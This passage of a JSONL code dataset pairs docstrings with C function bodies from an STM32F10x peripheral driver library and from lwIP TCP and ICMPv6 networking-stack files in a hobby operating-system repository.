/* Write to TIMx CR2 */\n  TIMx->CR2 = tmpcr2;\n  \n  /* Write to TIMx CCMR2 */  \n  TIMx->CCMR2 = tmpccmrx;\n\n  /* Set the Capture Compare Register value */\n  TIMx->CCR4 = TIM_OCInitStruct->TIM_Pulse;\n  \n  /* Write to TIMx CCER */\n  TIMx->CCER = tmpccer;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Checks whether the specified PWR flag is set or not.\n  * @param  PWR_FLAG: specifies the flag to check.\n  *   This parameter can be one of the following values:\n  *     @arg PWR_FLAG_WU: Wake Up flag\n  *     @arg PWR_FLAG_SB: StandBy flag\n  *     @arg PWR_FLAG_PVDO: PVD Output\n  * @retval The new state of PWR_FLAG (SET or RESET).\n  */\n", "func_signal": "FlagStatus PWR_GetFlagStatus(uint32_t PWR_FLAG)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_PWR_GET_FLAG(PWR_FLAG));\n  \n  if ((PWR->CSR & PWR_FLAG) != (uint32_t)RESET)\n  {\n    bitstatus = SET;\n  }\n  else\n  {\n    bitstatus = RESET;\n  }\n  /* Return the flag status */\n  return bitstatus;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_pwr.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Configures the TIMx Channel 1N polarity.\n  * @param  TIMx: where x can be 1, 8, 15, 16 or 17 to select the TIM peripheral.\n  * @param  TIM_OCNPolarity: specifies the OC1N Polarity\n  *   This parameter can be one of the following values:\n  *     @arg TIM_OCNPolarity_High: Output Compare active high\n  *     @arg TIM_OCNPolarity_Low: Output Compare active low\n  * @retval None\n  */\n", "func_signal": "void TIM_OC1NPolarityConfig(TIM_TypeDef* TIMx, uint16_t TIM_OCNPolarity)", "code": "{\n  uint16_t tmpccer = 0;\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST2_PERIPH(TIMx));\n  assert_param(IS_TIM_OCN_POLARITY(TIM_OCNPolarity));\n   \n  tmpccer = TIMx->CCER;\n  /* Set or Reset the CC1NP Bit */\n  tmpccer &= (uint16_t)~((uint16_t)TIM_CCER_CC1NP);\n  tmpccer |= TIM_OCNPolarity;\n  /* Write to TIMx CCER register */\n  TIMx->CCER = tmpccer;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Sets the TIMx Autoreload Register value\n  * @param  TIMx: where x can be 1 to 17 to select the TIM peripheral.\n  * @param  Autoreload: specifies the Autoreload register new value.\n  * @retval None\n  */\n", "func_signal": "void TIM_SetAutoreload(TIM_TypeDef* TIMx, uint16_t Autoreload)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_ALL_PERIPH(TIMx));\n  /* Set the Autoreload Register value */\n  TIMx->ARR = Autoreload;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Configures the TIMx Output Compare 2 Fast feature.\n  * @param  TIMx: where x can be  1, 2, 3, 4, 5, 8, 9, 12 or 15 to select \n  *         the TIM peripheral.\n  * @param  TIM_OCFast: new state of the Output Compare Fast Enable Bit.\n  *   This parameter can be one of the following values:\n  *     @arg TIM_OCFast_Enable: TIM output compare fast enable\n  *     @arg TIM_OCFast_Disable: TIM output compare fast disable\n  * @retval None\n  */\n", "func_signal": "void TIM_OC2FastConfig(TIM_TypeDef* TIMx, uint16_t TIM_OCFast)", "code": "{\n  uint16_t tmpccmr1 = 0;\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST6_PERIPH(TIMx));\n  assert_param(IS_TIM_OCFAST_STATE(TIM_OCFast));\n  /* Get the TIMx CCMR1 register value */\n  tmpccmr1 = TIMx->CCMR1;\n  /* Reset the OC2FE Bit */\n  tmpccmr1 &= (uint16_t)~((uint16_t)TIM_CCMR1_OC2FE);\n  /* Enable or Disable the Output Compare Fast Bit */\n  tmpccmr1 |= (uint16_t)(TIM_OCFast << 8);\n  /* Write to TIMx CCMR1 */\n  TIMx->CCMR1 = tmpccmr1;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Configures the TIMx Internal Trigger as External Clock\n  * @param  TIMx: where x can be  1, 2, 3, 4, 5, 9, 12 or 15 to select the TIM peripheral.\n  * @param  TIM_ITRSource: Trigger source.\n  *   This parameter can be one of the following values:\n  * @param  TIM_TS_ITR0: Internal Trigger 0\n  * @param  TIM_TS_ITR1: Internal Trigger 1\n  * @param  TIM_TS_ITR2: Internal Trigger 2\n  * @param  TIM_TS_ITR3: Internal Trigger 3\n  * @retval None\n  */\n", "func_signal": "void TIM_ITRxExternalClockConfig(TIM_TypeDef* TIMx, uint16_t TIM_InputTriggerSource)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST6_PERIPH(TIMx));\n  assert_param(IS_TIM_INTERNAL_TRIGGER_SELECTION(TIM_InputTriggerSource));\n  /* Select the Internal Trigger */\n  TIM_SelectInputTrigger(TIMx, TIM_InputTriggerSource);\n  /* Select the External clock mode1 */\n  TIMx->SMCR |= TIM_SlaveMode_External1;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Forces the TIMx output 2 waveform to active or inactive level.\n  * @param  TIMx: where x can be  1, 2, 3, 4, 5, 8, 9, 12 or 15 to select the TIM peripheral.\n  * @param  TIM_ForcedAction: specifies the forced Action to be set to the output waveform.\n  *   This parameter can be one of the following values:\n  *     @arg TIM_ForcedAction_Active: Force active level on OC2REF\n  *     @arg TIM_ForcedAction_InActive: Force inactive level on OC2REF.\n  * @retval None\n  */\n", "func_signal": "void TIM_ForcedOC2Config(TIM_TypeDef* TIMx, uint16_t TIM_ForcedAction)", "code": "{\n  uint16_t tmpccmr1 = 0;\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST6_PERIPH(TIMx));\n  assert_param(IS_TIM_FORCED_ACTION(TIM_ForcedAction));\n  tmpccmr1 = TIMx->CCMR1;\n  /* Reset the OC2M Bits */\n  tmpccmr1 &= (uint16_t)~((uint16_t)TIM_CCMR1_OC2M);\n  /* Configure The Forced output Mode */\n  tmpccmr1 |= (uint16_t)(TIM_ForcedAction << 8);\n  /* Write to TIMx CCMR1 register */\n  TIMx->CCMR1 = tmpccmr1;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Configures the TIMx internal Clock\n  * @param  TIMx: where x can be  1, 2, 3, 4, 5, 8, 9, 12 or 15\n  *         to select the TIM peripheral.\n  * @retval None\n  */\n", "func_signal": "void TIM_InternalClockConfig(TIM_TypeDef* TIMx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST6_PERIPH(TIMx));\n  /* Disable slave mode to clock the prescaler directly with the internal clock */\n  TIMx->SMCR &=  (uint16_t)(~((uint16_t)TIM_SMCR_SMS));\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Selects the Input Trigger source\n  * @param  TIMx: where x can be  1, 2, 3, 4, 5, 8, 9, 12 or 15 to select the TIM peripheral.\n  * @param  TIM_InputTriggerSource: The Input Trigger source.\n  *   This parameter can be one of the following values:\n  *     @arg TIM_TS_ITR0: Internal Trigger 0\n  *     @arg TIM_TS_ITR1: Internal Trigger 1\n  *     @arg TIM_TS_ITR2: Internal Trigger 2\n  *     @arg TIM_TS_ITR3: Internal Trigger 3\n  *     @arg TIM_TS_TI1F_ED: TI1 Edge Detector\n  *     @arg TIM_TS_TI1FP1: Filtered Timer Input 1\n  *     @arg TIM_TS_TI2FP2: Filtered Timer Input 2\n  *     @arg TIM_TS_ETRF: External Trigger input\n  * @retval None\n  */\n", "func_signal": "void TIM_SelectInputTrigger(TIM_TypeDef* TIMx, uint16_t TIM_InputTriggerSource)", "code": "{\n  uint16_t tmpsmcr = 0;\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST6_PERIPH(TIMx));\n  assert_param(IS_TIM_TRIGGER_SELECTION(TIM_InputTriggerSource));\n  /* Get the TIMx SMCR register value */\n  tmpsmcr = TIMx->SMCR;\n  /* Reset the TS Bits */\n  tmpsmcr &= (uint16_t)(~((uint16_t)TIM_SMCR_TS));\n  /* Set the Input Trigger source */\n  tmpsmcr |= TIM_InputTriggerSource;\n  /* Write to TIMx SMCR */\n  TIMx->SMCR = tmpsmcr;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Selects the TIMx peripheral Capture Compare DMA source.\n  * @param  TIMx: where x can be  1, 2, 3, 4, 5, 8, 15, 16 or 17 to select \n  *         the TIM peripheral.\n  * @param  NewState: new state of the Capture Compare DMA source\n  *   This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void TIM_SelectCCDMA(TIM_TypeDef* TIMx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST4_PERIPH(TIMx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Set the CCDS Bit */\n    TIMx->CR2 |= TIM_CR2_CCDS;\n  }\n  else\n  {\n    /* Reset the CCDS Bit */\n    TIMx->CR2 &= (uint16_t)~((uint16_t)TIM_CR2_CCDS);\n  }\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Configures the TIM peripheral according to the specified\n  *         parameters in the TIM_ICInitStruct to measure an external PWM signal.\n  * @param  TIMx: where x can be  1, 2, 3, 4, 5, 8, 9, 12 or 15 to select the TIM peripheral.\n  * @param  TIM_ICInitStruct: pointer to a TIM_ICInitTypeDef structure\n  *         that contains the configuration information for the specified TIM peripheral.\n  * @retval None\n  */\n", "func_signal": "void TIM_PWMIConfig(TIM_TypeDef* TIMx, TIM_ICInitTypeDef* TIM_ICInitStruct)", "code": "{\n  uint16_t icoppositepolarity = TIM_ICPolarity_Rising;\n  uint16_t icoppositeselection = TIM_ICSelection_DirectTI;\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST6_PERIPH(TIMx));\n  /* Select the Opposite Input Polarity */\n  if (TIM_ICInitStruct->TIM_ICPolarity == TIM_ICPolarity_Rising)\n  {\n    icoppositepolarity = TIM_ICPolarity_Falling;\n  }\n  else\n  {\n    icoppositepolarity = TIM_ICPolarity_Rising;\n  }\n  /* Select the Opposite Input */\n  if (TIM_ICInitStruct->TIM_ICSelection == TIM_ICSelection_DirectTI)\n  {\n    icoppositeselection = TIM_ICSelection_IndirectTI;\n  }\n  else\n  {\n    icoppositeselection = TIM_ICSelection_DirectTI;\n  }\n  if (TIM_ICInitStruct->TIM_Channel == TIM_Channel_1)\n  {\n    /* TI1 Configuration */\n    TI1_Config(TIMx, TIM_ICInitStruct->TIM_ICPolarity, TIM_ICInitStruct->TIM_ICSelection,\n               TIM_ICInitStruct->TIM_ICFilter);\n    /* Set the Input Capture Prescaler value */\n    TIM_SetIC1Prescaler(TIMx, TIM_ICInitStruct->TIM_ICPrescaler);\n    /* TI2 Configuration */\n    TI2_Config(TIMx, icoppositepolarity, icoppositeselection, TIM_ICInitStruct->TIM_ICFilter);\n    /* Set the Input Capture Prescaler value */\n    TIM_SetIC2Prescaler(TIMx, TIM_ICInitStruct->TIM_ICPrescaler);\n  }\n  else\n  { \n    /* TI2 Configuration */\n    TI2_Config(TIMx, TIM_ICInitStruct->TIM_ICPolarity, TIM_ICInitStruct->TIM_ICSelection,\n               TIM_ICInitStruct->TIM_ICFilter);\n    /* Set the Input Capture Prescaler value */\n    TIM_SetIC2Prescaler(TIMx, TIM_ICInitStruct->TIM_ICPrescaler);\n    /* TI1 Configuration */\n    TI1_Config(TIMx, icoppositepolarity, icoppositeselection, TIM_ICInitStruct->TIM_ICFilter);\n    /* Set the Input Capture Prescaler value */\n    TIM_SetIC1Prescaler(TIMx, TIM_ICInitStruct->TIM_ICPrescaler);\n  }\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Configures the TIMx channel 4 polarity.\n  * @param  TIMx: where x can be 1, 2, 3, 4, 5 or 8 to select the TIM peripheral.\n  * @param  TIM_OCPolarity: specifies the OC4 Polarity\n  *   This parameter can be one of the following values:\n  *     @arg TIM_OCPolarity_High: Output Compare active high\n  *     @arg TIM_OCPolarity_Low: Output Compare active low\n  * @retval None\n  */\n", "func_signal": "void TIM_OC4PolarityConfig(TIM_TypeDef* TIMx, uint16_t TIM_OCPolarity)", "code": "{\n  uint16_t tmpccer = 0;\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST3_PERIPH(TIMx));\n  assert_param(IS_TIM_OC_POLARITY(TIM_OCPolarity));\n  tmpccer = TIMx->CCER;\n  /* Set or Reset the CC4P Bit */\n  tmpccer &= (uint16_t)~((uint16_t)TIM_CCER_CC4P);\n  tmpccer |= (uint16_t)(TIM_OCPolarity << 12);\n  /* Write to TIMx CCER register */\n  TIMx->CCER = tmpccer;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Gets the TIMx Input Capture 2 value.\n  * @param  TIMx: where x can be 1, 2, 3, 4, 5, 8, 9, 12 or 15 to select the TIM peripheral.\n  * @retval Capture Compare 2 Register value.\n  */\n", "func_signal": "uint16_t TIM_GetCapture2(TIM_TypeDef* TIMx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST6_PERIPH(TIMx));\n  /* Get the Capture 2 Register value */\n  return TIMx->CCR2;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Fills each TIM_OCInitStruct member with its default value.\n  * @param  TIM_OCInitStruct : pointer to a TIM_OCInitTypeDef structure which will\n  *         be initialized.\n  * @retval None\n  */\n", "func_signal": "void TIM_OCStructInit(TIM_OCInitTypeDef* TIM_OCInitStruct)", "code": "{\n  /* Set the default configuration */\n  TIM_OCInitStruct->TIM_OCMode = TIM_OCMode_Timing;\n  TIM_OCInitStruct->TIM_OutputState = TIM_OutputState_Disable;\n  TIM_OCInitStruct->TIM_OutputNState = TIM_OutputNState_Disable;\n  TIM_OCInitStruct->TIM_Pulse = 0x0000;\n  TIM_OCInitStruct->TIM_OCPolarity = TIM_OCPolarity_High;\n  TIM_OCInitStruct->TIM_OCNPolarity = TIM_OCPolarity_High;\n  TIM_OCInitStruct->TIM_OCIdleState = TIM_OCIdleState_Reset;\n  TIM_OCInitStruct->TIM_OCNIdleState = TIM_OCNIdleState_Reset;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/**\n  * @brief  Sets or Resets the TIMx Master/Slave Mode.\n  * @param  TIMx: where x can be 1, 2, 3, 4, 5, 8, 9, 12 or 15 to select the TIM peripheral.\n  * @param  TIM_MasterSlaveMode: specifies the Timer Master Slave Mode.\n  *   This parameter can be one of the following values:\n  *     @arg TIM_MasterSlaveMode_Enable: synchronization between the current timer\n  *                                      and its slaves (through TRGO).\n  *     @arg TIM_MasterSlaveMode_Disable: No action\n  * @retval None\n  */\n", "func_signal": "void TIM_SelectMasterSlaveMode(TIM_TypeDef* TIMx, uint16_t TIM_MasterSlaveMode)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_TIM_LIST6_PERIPH(TIMx));\n  assert_param(IS_TIM_MSM_STATE(TIM_MasterSlaveMode));\n  /* Reset the MSM Bit */\n  TIMx->SMCR &= (uint16_t)~((uint16_t)TIM_SMCR_MSM);\n  \n  /* Set or Reset the MSM Bit */\n  TIMx->SMCR |= TIM_MasterSlaveMode;\n}", "path": "Firmware\\stm_lib\\src\\stm32f10x_tim.c", "repo_name": "facebookarchive/LatencyTester", "stars": 61, "license": "None", "language": "c", "size": 2387}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * tcp_seg_free():\n *\n * Frees a TCP segment.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "u8_t\ntcp_seg_free(struct tcp_seg *seg)", "code": "{\n  u8_t count = 0;\n  \n  if(seg != NULL) {\n    if(seg->p == NULL) {\n      memp_free(MEMP_TCP_SEG, seg);\n    } else {\n      count = pbuf_free(seg->p);\n#if TCP_DEBUG\n      seg->p = NULL;\n#endif /* TCP_DEBUG */\n      memp_free(MEMP_TCP_SEG, seg);\n    }\n  }\n  return count;\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/** Put in here for libm. Seems to want it. */\n", "func_signal": "void __assert_fail(const char *assertion,\n\t\t\t\t   const char *file,\n\t\t\t\t   unsigned int line,\n\t\t\t\t   const char *function)", "code": "{\n\tfprintf( stderr, \"%s:%i: %s: Assertion %s failed.\",\n\t\t\t\t\tfile,\n\t\t\t\t\tline,\n\t\t\t\t\tfunction,\n\t\t\t\t\tassertion );\n\tabort();\n}", "path": "lib\\unix\\assert.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\nicmp_input(struct pbuf *p, struct netif *inp)", "code": "{\n  unsigned char type;\n  struct icmp_echo_hdr *iecho;\n  struct ip_hdr *iphdr;\n  struct ip_addr tmpaddr;\n  \n \n#ifdef ICMP_STATS\n  ++stats.icmp.recv;\n#endif /* ICMP_STATS */\n\n  type = ((char *)p->payload)[0];\n\n  switch(type) {\n  case ICMP6_ECHO:\n    DEBUGF(ICMP_DEBUG, (\"icmp_input: ping\\n\"));\n\n    if(p->tot_len < sizeof(struct icmp_echo_hdr)) {\n      DEBUGF(ICMP_DEBUG, (\"icmp_input: bad ICMP echo received\\n\"));\n\n      pbuf_free(p);\n#ifdef ICMP_STATS\n      ++stats.icmp.lenerr;\n#endif /* ICMP_STATS */\n\n      return;      \n    }\n    iecho = p->payload;\n    iphdr = (struct ip_hdr *)((char *)p->payload - IP_HLEN);\n    if(inet_chksum_pbuf(p) != 0) {\n      DEBUGF(ICMP_DEBUG, (\"icmp_input: checksum failed for received ICMP echo (%x)\\n\", inet_chksum_pseudo(p, &(iphdr->src), &(iphdr->dest), IP_PROTO_ICMP, p->tot_len)));\n\n#ifdef ICMP_STATS\n      ++stats.icmp.chkerr;\n#endif /* ICMP_STATS */\n    /*      return;*/\n    }\n    DEBUGF(ICMP_DEBUG, (\"icmp: p->len %d p->tot_len %d\\n\", p->len, p->tot_len));\n    ip_addr_set(&tmpaddr, &(iphdr->src));\n    ip_addr_set(&(iphdr->src), &(iphdr->dest));\n    ip_addr_set(&(iphdr->dest), &tmpaddr);\n    iecho->type = ICMP6_ER;\n    /* adjust the checksum */\n    if(iecho->chksum >= htons(0xffff - (ICMP6_ECHO << 8))) {\n      iecho->chksum += htons(ICMP6_ECHO << 8) + 1;\n    } else {\n      iecho->chksum += htons(ICMP6_ECHO << 8);\n    }\n    DEBUGF(ICMP_DEBUG, (\"icmp_input: checksum failed for received ICMP echo (%x)\\n\", inet_chksum_pseudo(p, &(iphdr->src), &(iphdr->dest), IP_PROTO_ICMP, p->tot_len)));\n#ifdef ICMP_STATS\n    ++stats.icmp.xmit;\n#endif /* ICMP_STATS */\n\n    /*    DEBUGF(\"icmp: p->len %d p->tot_len %d\\n\", p->len, p->tot_len);*/\n    ip_output_if(p, &(iphdr->src), IP_HDRINCL,\n\t\t iphdr->hoplim, IP_PROTO_ICMP, inp);\n    break; \n  default:\n    DEBUGF(ICMP_DEBUG, (\"icmp_input: ICMP type not supported.\\n\"));\n\n#ifdef ICMP_STATS\n    ++stats.icmp.proterr;\n    ++stats.icmp.drop;\n#endif /* ICMP_STATS */\n  }\n\n  pbuf_free(p);\n}", "path": "ports\\lwip\\src\\core\\ipv6\\icmp6.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * tcp_connect():\n *\n * Connects to another host. The function given as the \"connected\"\n * argument will be called when the connection has been established.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "err_t\ntcp_connect(struct tcp_pcb *pcb, struct ip_addr *ipaddr, u16_t port,\n\t    err_t (* connected)(void *arg, struct tcp_pcb *tpcb, err_t err))", "code": "{\n  u32_t optdata;\n  err_t ret;\n  u32_t iss;\n\n  magic (pcb, TCPPCB_MAGIC);\n\n  DEBUGF(TCP_DEBUG, (\"tcp_connect to port %d\\n\", port));\n  if(ipaddr != NULL) {\n    pcb->remote_ip = *ipaddr;\n  } else {\n    return ERR_VAL;\n  }\n\n  pcb->remote_port = port;\n\n if(pcb->local_port == 0) {\n    pcb->local_port = tcp_new_port();\n }\n \n#ifdef BIND_CHECK\n  if (pcb->state == BIND) {\n#ifdef __PAULOS__\n    TCP_RMV((&tcp_bind_pcbs_hash[get_hash (pcb->local_port)]), pcb);\n#else\n    TCP_RMV((&tcp_bind_pcbs), pcb);\n#endif\n  }\n#endif\n\n  \t  //->\n  iss = tcp_next_iss();\n  pcb->rcv_nxt = 0;\n  pcb->snd_nxt = iss;\n  pcb->lastack = iss - 1;\n  pcb->snd_lbb = iss - 1;\n  pcb->rcv_wnd = TCP_WND;\n  pcb->snd_wnd = TCP_WND;\n#ifdef __PAULOS__\n  assert(pcb->mss == TCP_MSS_SMALL || pcb->mss == TCP_MSS_MEDIUM || pcb->mss == TCP_MSS_LARGE);\n#else\n  pcb->mss = TCP_MSS;\n#endif\n  pcb->cwnd = 1;\n  pcb->ssthresh = pcb->mss * 10;\n  pcb->state = SYN_SENT;\n#if LWIP_CALLBACK_API  \n  pcb->connected = connected;\n#endif /* LWIP_CALLBACK_API */  \n  TCP_REG(&tcp_active_pcbs, pcb);\n  /* Build an MSS option */\n  optdata = HTONL(((u32_t)2 << 24) | \n\t\t  ((u32_t)4 << 16) | \n\t\t  (((u32_t)pcb->mss / 256) << 8) |\n\t\t  (pcb->mss & 255));\n\n  ret = tcp_enqueue(pcb, NULL, 0, TCP_SYN, 0, (u8_t *)&optdata, 4);\n  if(ret == ERR_OK) { \n    tcp_output(pcb);\n  }\n  return ret;\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\ntcp_debug_print_pcbs(void)", "code": "{\n  struct tcp_pcb *pcb;\n  DEBUGF(TCP_DEBUG, (\"Active PCB states:\\n\"));\n  for(pcb = tcp_active_pcbs; pcb != NULL; pcb = pcb->next) {\n    DEBUGF(TCP_DEBUG, (\"Local port %d, foreign port %d snd_nxt %lu rcv_nxt %lu \",\n                       pcb->local_port, pcb->remote_port,\n                       pcb->snd_nxt, pcb->rcv_nxt));\n    tcp_debug_print_state(pcb->state);\n  }    \n#ifdef BIND_CHECK\n  DEBUGF(TCP_DEBUG, (\"Bind PCB states:\\n\"));\n#ifdef __PAULOS__\n  {\n    for (i = 0; i < TCP_HASH_TABLE_SIZE; i++) {\n      struct tcp_pcb *tcp_bind_pcbs;\n      tcp_bind_pcbs = tcp_bind_pcbs_hash[i];\n#endif\n\n  for(pcb = (struct tcp_pcb *)tcp_bind_pcbs; pcb != NULL; pcb = pcb->next) {\n    DEBUGF(TCP_DEBUG, (\"Local port %d, foreign port %d snd_nxt %lu rcv_nxt %lu \",\n                       pcb->local_port, pcb->remote_port,\n                       pcb->snd_nxt, pcb->rcv_nxt));\n    tcp_debug_print_state(pcb->state);\n  }    \n#endif\n#ifdef __PAULOS__\n    }\n  }\n#endif\n\n  DEBUGF(TCP_DEBUG, (\"Listen PCB states:\\n\"));\n  for(pcb = (struct tcp_pcb *)tcp_listen_pcbs; pcb != NULL; pcb = pcb->next) {\n    DEBUGF(TCP_DEBUG, (\"Local port %d, foreign port %d snd_nxt %lu rcv_nxt %lu \",\n                       pcb->local_port, pcb->remote_port,\n                       pcb->snd_nxt, pcb->rcv_nxt));\n    tcp_debug_print_state(pcb->state);\n  }    \n  DEBUGF(TCP_DEBUG, (\"TIME-WAIT PCB states:\\n\"));\n  for(pcb = tcp_tw_pcbs; pcb != NULL; pcb = pcb->next) {\n    DEBUGF(TCP_DEBUG, (\"Local port %d, foreign port %d snd_nxt %lu rcv_nxt %lu \",\n                       pcb->local_port, pcb->remote_port,\n                       pcb->snd_nxt, pcb->rcv_nxt));\n    tcp_debug_print_state(pcb->state);\n  }    \n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * tcp_next_iss():\n *\n * Calculates a new initial sequence number for new connections.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "u32_t\ntcp_next_iss(void)", "code": "{\n  static u32_t iss = 6510;\n  \n  iss += tcp_ticks;       /* XXX */\n  return iss;\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n", "func_signal": "err_t\ntcp_bind(struct tcp_pcb *pcb, struct ip_addr *ipaddr, u16_t port)", "code": "{\n  struct tcp_pcb *cpcb;\n#ifdef __PAULOS__\n  struct tcp_pcb **tcp_bind_pcbs;\n#endif\n\n  magic (pcb, TCPPCB_MAGIC);\n\n  /* Check if the address already is in use. */\n  for(cpcb = (struct tcp_pcb *)tcp_listen_pcbs;\n      cpcb != NULL; cpcb = cpcb->next) {\n    magic (cpcb, TCPPCB_MAGIC);\n    if(cpcb->local_port == port) {\n      if(ip_addr_isany(&(cpcb->local_ip)) ||\n\t ip_addr_isany(ipaddr) ||\n\t ip_addr_cmp(&(cpcb->local_ip), ipaddr)) {\n\treturn ERR_USE;\n      }\n    }\n  }\n#ifdef BIND_CHECK\n\n#ifdef __PAULOS__\n  tcp_bind_pcbs = &tcp_bind_pcbs_hash[get_hash (port)];\n  for(cpcb = *tcp_bind_pcbs;\n      cpcb != NULL; cpcb = cpcb->next) \n#else\n  for(cpcb = tcp_bind_pcbs;\n      cpcb != NULL; cpcb = cpcb->next) \n#endif\n    {\n    magic (cpcb, TCPPCB_MAGIC);\n    if(cpcb->local_port == port) {\n      if(ip_addr_isany(&(cpcb->local_ip)) ||\n\t ip_addr_isany(ipaddr) ||\n\t ip_addr_cmp(&(cpcb->local_ip), ipaddr)) {\n\treturn ERR_USE;\n      }\n    }\n  }\n#endif\n  for(cpcb = tcp_active_pcbs;\n      cpcb != NULL; cpcb = cpcb->next) {\n    if(cpcb->local_port == port) {\n      if(ip_addr_isany(&(cpcb->local_ip)) ||\n\t ip_addr_isany(ipaddr) ||\n\t ip_addr_cmp(&(cpcb->local_ip), ipaddr)) {\n\treturn ERR_USE;\n      }\n    }\n  }\n  if(!ip_addr_isany(ipaddr)) {\n    pcb->local_ip = *ipaddr;\n  }\n  pcb->local_port = port;\n#ifdef BIND_CHECK\n  pcb->state = BIND;\n#ifdef __PAULOS__\n  TCP_REG(tcp_bind_pcbs, pcb);\n#else\n  TCP_REG(&tcp_bind_pcbs, pcb);\n#endif\n#endif\n  DEBUGF(TCP_DEBUG, (\"tcp_bind: bind to port %d\\n\", port));\n  return ERR_OK;\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", "language": "c", "size": 17752}
{"docstring": "/*-----------------------------------------------------------------------------------*/\n/*\n * tcp_tmr():\n *\n * Called periodically to dispatch TCP timers.\n *\n */\n/*-----------------------------------------------------------------------------------*/\n", "func_signal": "void\ntcp_tmr(void)", "code": "{\n  ++tcp_timer;\n  if(tcp_timer == 10) {\n    tcp_timer = 0;\n  }\n  \n  if(tcp_timer & 1) {\n    /* Call tcp_fasttmr() every 200 ms, i.e., every other timer\n       tcp_tmr() is called. */\n    tcp_fasttmr();\n  }\n  if(tcp_timer == 0 || tcp_timer == 5) {\n    /* Call tcp_slowtmr() every 500 ms, i.e., every fifth timer\n       tcp_tmr() is called. */\n    tcp_slowtmr();\n    reass_tmr();\n#ifdef HAVE_IPSEC\n    ipsec_tmr();\n#endif\n  }\n}", "path": "ports\\lwip\\src\\core\\tcp.c", "repo_name": "kingcope/LikeOS", "stars": 32, "license": "None", 